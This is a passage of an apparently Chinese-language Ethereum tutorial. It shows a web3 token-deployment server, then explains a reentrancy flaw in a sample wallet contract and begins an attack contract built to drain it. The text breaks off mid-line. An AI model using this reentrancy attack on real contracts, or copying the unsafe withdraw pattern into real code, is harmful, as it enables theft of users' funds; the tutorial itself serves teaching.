0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">standardtoken</span> <span class="cm-operator">=</span> <span class="cm-variable">standardtokenContract</span>.<span class="cm-property">new</span>(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">initialSupply</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">tokenName</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">decimalUnits</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">tokenSymbol</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-property">from</span>: <span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">accounts</span>[<span class="cm-number">0</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-property">data</span>: <span class="cm-variable">standardtokenABI</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-property">gas</span>: <span class="cm-string">'4700000'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>},</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">function</span> (<span class="cm-def">e</span>, <span class="cm-def">contract</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">//console.log(e, contract);</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">address</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-string">'Contract mined! address: '</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">address</span> <span class="cm-operator">+</span> <span class="cm-string">' transactionHash: '</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">transactionHash</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">writeHead</span>(<span class="cm-number">200</span>, {<span class="cm-string cm-property">'Content-Type'</span>: <span class="cm-string">'application/json'</span>});</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">body</span> <span class="cm-operator">=</span> <span class="cm-string">'{"erro": 0, "address": "'</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">address</span> <span class="cm-operator">+</span> <span class="cm-string">'", "hash": "'</span> <span class="cm-operator">+</span> <span class="cm-variable-2">contract</span>.<span class="cm-property">transactionHash</span> <span class="cm-operator">+</span> <span class="cm-string">'"}'</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">write</span>(<span class="cm-variable-2">body</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">end</span>();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>});</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}).<span class="cm-property">listen</span>(<span class="cm-number">12306</span>); <span class="cm-comment">// the server object listens on port 12306</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 4696px;"></div><div class="CodeMirror-gutters" style="display: none; height: 4696px;"></div></div></div></pre><p>客户端可以通过 curl 访问，如下所示</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">curl</span> http://localhost:12306 <span class="cm-attribute">-d</span> <span class="cm-string">'{"initialSupply":1000,"tokenName":"Hello World Token","decimalUnits":18,"tokenSymbol":"HWT"}'</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{<span class="cm-string">"erro"</span>: <span class="cm-number">0</span>, <span class="cm-string">"address"</span>: <span class="cm-string">"0x4aa8abdc9361040689154f28e9fbf6229862d6ca"</span>, <span class="cm-string">"hash"</span>: <span class="cm-string">"0xd32d279af7b4d4b9f47167caeca0b0c2e8db0698a367aadc6868050251a20e1c"</span>}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 100px;"></div><div class="CodeMirror-gutters" style="display: none; height: 100px;"></div></div></div></pre><h3><a name='header-n437' class='md-header-anchor '></a>以太坊智能合约攻击：重入</h3><h4><a name='header-n438' class='md-header-anchor '></a>公共钱包合约</h4><p>合约实现了一个类似公共钱包的代码，其中，balances 定义了一个下标为 [address] 的公共钱包，deposit 函数向钱包中调用者的位置存入相应的 value 值，withdraw 函数检查提币账户的余额与该合约资产是否大于参数 amount，之后向 to 地址发送相应 ether。</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">pragma</span> <span class="cm-variable">solidity</span> <span class="cm-operator">^</span><span class="cm-number">0.4.19</span>;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">IDMoney</span>{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">address</span> <span class="cm-variable">_owner</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">mapping</span> (<span class="cm-def">address</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable">uint256</span>) <span class="cm-variable">balances</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">IDMoney</span>() {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">_owner</span> <span class="cm-operator">=</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">deposit</span>() <span class="cm-variable">public</span> <span class="cm-variable">payable</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">+=</span> <span class="cm-variable">msg</span>.<span class="cm-property">value</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">withdraw</span>(<span class="cm-def">address</span> <span class="cm-variable">to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">amount</span>) <span class="cm-variable">public</span> <span class="cm-variable">payable</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">&gt;=</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-keyword">this</span>.<span class="cm-property">balance</span> <span class="cm-operator">&gt;=</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">to</span>.<span class="cm-property">call</span>.<span class="cm-property">value</span>(<span class="cm-variable">amount</span>)();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">-=</span> <span class="cm-variable">amount</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">balanceof</span>(<span class="cm-def">address</span> <span class="cm-variable">to</span>) <span class="cm-variable">constant</span> <span class="cm-variable">returns</span>(<span class="cm-variable">uint256</span>){</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">balances</span>[<span class="cm-variable">to</span>];</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 537px;"></div><div class="CodeMirror-gutters" style="display: none; height: 537px;"></div></div></div></pre><h4><a name='header-n442' class='md-header-anchor '></a>存在的问题</h4><blockquote><p>Solidity 中 <address>.transfer()，<address>.send() 和 <address>.call.vale()() 都可以用于向某一地址发送 ether，他们的区别在于：</p><p> <address>.transfer()</p><ul><li>当发送失败时会 throw; 回滚状态</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul><p><address>.send()</p><ul><li>当发送失败时会返回 false 布尔值</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul><p><address>.call.value()()</p><ul><li>当发送失败时会返回 false 布尔值</li><li>传递所有可用 Gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）</li></ul></blockquote><p>当外部账户或其他合约向一个合约地址发送 ether 时，会执行该合约的 fallback函数（当调用合约时没有匹配到函数，也会调用没有名字的 fallback 函数）。且 call.value() 会将所有可用 gas 给予外部调用（fallback 函数），若在 fallback 函数中再调用 withdraw 函数，则会导致递归问题。攻击者可以部署一个恶意递归的合约将公共钱包这个合约账户里的 ether 全部提出来。</p><p><strong>前提条件：</strong></p><ol start='' ><li>call.value() 提供了足够的  gas</li><li>资产的修改在转币之后</li></ol><h4><a name='header-n484' class='md-header-anchor '></a>攻击合约</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">pragma</span> <span class="cm-variable">solidity</span> <span class="cm-operator">^</span><span class="cm-number">0.4.10</span>;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">IDMoney</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">address</span> <span class="cm-variable">owner</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">mapping</span> (<span class="cm-def">address</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable">uint256</span>) <span class="cm-variable">balances</span>; &nbsp;<span class="cm-comment">// 记录每个打币者存入的资产情况</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">event</span> <span class="cm-variable">withdrawLog</span>(<span class="cm-variable">address</span>, <span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">IDMoney</span>() { <span class="cm-variable">owner</span> <span class="cm-operator">=</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">deposit</span>() <span class="cm-variable">payable</span> { <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">+=</span> <span class="cm-variable">msg</span>.<span class="cm-property">value</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">withdraw</span>(<span class="cm-def">address</span> <span class="cm-variable">to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">amount</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">&gt;</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-keyword">this</span>.<span class="cm-property">balance</span> <span class="cm-operator">&gt;</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">withdrawLog</span>(<span class="cm-variable">to</span>, <span class="cm-variable">amount</span>); &nbsp;<span class="cm-comment">// 打印日志，方便观察 reentrancy</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">to</span>.<span class="cm-property">call</span>.<span class="cm-property">value</span>(<span class="cm-variable">amount</span>)(); &nbsp;<span class="cm-comment">// 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">-=</span> <span class="cm-variable">amount</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">balanceOf</span>() <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) { <span class="cm-keyword">return</span> <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>]; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">balanceOf</span>(<span class="cm-def">address</span> <span class="cm-variable">addr</span>) <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) { <span class="cm-keyword">return</span> <span class="cm-variable">balances</span>[<span class="cm-variable">addr</span>]; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">Attack</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">address</span> <span class="cm-variable">owner</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">address</span> <span class="cm-variable">victim</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">event</span> <span class="cm-variable">depositLog</span>(<span class="cm-variable">uint256</span>, <span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">modifier</span> <span class="cm-variable">ownerOnly</span> { <span class="cm-variable">require</span>(<span class="cm-variable">owner</span> <span class="cm-operator">==</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>); <span class="cm-variable">_</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">Attack</span>() <span class="cm-variable">payable</span> { <span class="cm-variable">owner</span> <span class="cm-operator">=</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// 设置已部署的 IDMoney 合约实例地址</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">setVictim</span>(<span class="cm-def">address</span> <span class="cm-variable">target</span>) <span class="cm-variable">ownerOnly</span> { <span class="cm-variable">victim</span> <span class="cm-operator">=</span> <span class="cm-variable">target</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// deposit Ether to IDMoney deployed</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">step1</span>(<span class="cm-def">uint256</span> <span class="cm-variable">amount</span>) <span class="cm-variable">ownerOnly</span> <span class="cm-variable">payable</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">depositLog</span>(<span class="cm-keyword">this</span>.<span class="cm-property">balance</span>, <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-keyword">this</span>.<span class="cm-property">balance</span> <span class="cm-operator">&gt;</span> <span class="cm-variable">amount</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">victim</span>.<span 